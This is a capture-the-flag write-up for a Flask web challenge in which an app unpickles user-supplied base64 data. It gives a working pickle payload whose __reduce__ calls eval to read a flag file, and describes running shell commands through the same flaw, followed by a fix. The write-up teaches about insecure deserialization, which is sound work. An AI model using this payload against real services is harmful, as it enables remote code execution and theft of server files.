---
title: "Clicker — insecure deserialization"
category: Web
host: unserialize.is-course.ru
points: 100
tags: [pickle, rce, flask, deserialization]
technique: "`pickle.loads` on user input → RCE → flag in the error echo"
status: solved
---

# Clicker

## TL;DR
`/save` exports your clicker progress as `base64(pickle.dumps(obj))`; `/import` feeds the textarea
straight back into `base64.b64decode(...)` + `pickle.loads(...)`. A crafted pickle gives remote code
execution, and the debug error page conveniently echoes `repr()` of the unpickled object.

## Recon
The app is Flask (`session` cookie is `itsdangerous`-signed: `eyJzY29yZSI6MX0.<ts>.<sig>`).
`POST /save` returns nothing visible; `POST /import` with junk produces a traceback that names the sink:

```
File "/home/app/app.py", line 100, in interpret
    obj = pickle.loads(blob)
_pickle.UnpicklingError: invalid load key, '{'.
```

A dict round-trips fine (`{"score": 42}` → `Clicks: 42`), confirming the format.

## Exploitation
The container has no egress (`curl` missing, outbound HTTP blocked), so instead of a reverse shell the
flag is read *into the error message* — the handler does `repr(obj)` when the object is not a valid
progress dict:

```python
class T:
    def __reduce__(self):
        return (eval, ("open('/home/app/flag.txt').read()",))

payload = base64.b64encode(pickle.dumps(T())).decode()
requests.post("https://unserialize.is-course.ru/import", data={"progress": payload})
```

```
Error: could not import progress: 'YDS{…redacted…}'
```

`ls -la /home/app` (via `subprocess.getoutput`) showed the layout first: `app.py`, `flag.txt`,
`static/`, `templates/`. Note the app lives in `/home/app`, not `/app`.

## Fix
Never unpickle untrusted data. Store progress as JSON with an HMAC, or keep it server-side keyed by
session id.
